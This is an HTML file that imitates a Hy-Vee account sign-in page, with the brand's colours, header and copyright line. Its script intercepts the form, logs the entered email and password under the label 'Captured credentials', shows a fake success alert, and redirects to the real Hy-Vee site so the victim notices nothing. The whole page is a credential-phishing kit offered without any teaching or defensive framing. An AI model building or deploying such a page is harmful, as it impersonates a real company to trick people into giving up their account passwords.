<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hy-Vee Account Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
        }
        .login-header {
            background: #e31837;
            color: white;
            padding: 25px;
            text-align: center;
        }
        .login-header h1 {
            font-weight: 600;
            font-size: 24px;
            margin-bottom: 5px;
        }
        .login-header p {
            opacity: 0.9;
            font-size: 14px;
        }
        .login-form {
            padding: 25px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: border 0.3s;
        }
        .form-group input:focus {
            border-color: #e31837;
            outline: none;
        }
        .btn-login {
            background: #e31837;
            color: white;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-login:hover {
            background: #c4142c;
        }
        .login-footer {
            text-align: center;
            padding: 20px;
            border-top: 1px solid #eee;
            font-size: 13px;
            color: #666;
        }
        .login-footer a {
            color: #e31837;
            text-decoration: none;
        }
        .hidden {
            display: none;
        }
        .error-message {
            color: #e31837;
            font-size: 14px;
            margin-top: 5px;
            text-align: center;
        }
        .forgot-link {
            text-align: right;
            margin-top: -10px;
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #0066cc;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>Hy-Vee Accounts</h1>
            <p>Sign in to access your account</p>
        </div>
        
        <form class="login-form" id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required placeholder="Enter your email">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required placeholder="Enter your password">
            </div>
            
            <div class="forgot-link">
                <a href="#">Forgot password?</a>
            </div>
            
            <button type="submit" class="btn-login">Sign In</button>
            
            <div class="error-message" id="errorMessage"></div>
        </form>
        
        <div class="login-footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
            <p>Â© 2023 Hy-Vee, Inc. All rights reserved.</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const errorElement = document.getElementById('errorMessage');
            
 
            if (!email || !password) {
                errorElement.textContent = 'Please enter both email and password';
                return;
            }
            
            errorElement.textContent = '';
            

            const submitButton = this.querySelector('.btn-login');
            submitButton.textContent = 'Signing in...';
            submitButton.disabled = true;
            
 
            setTimeout(() => {
            
                console.log('Captured credentials:');
                console.log('Email:', email);
                console.log('Password:', password);
                
       
                alert('Login successful! Redirecting...');
                
         
                window.location.href = 'https://www.hy-vee.com';
            }, 1500);
        });
    </script>
</body>
</html>
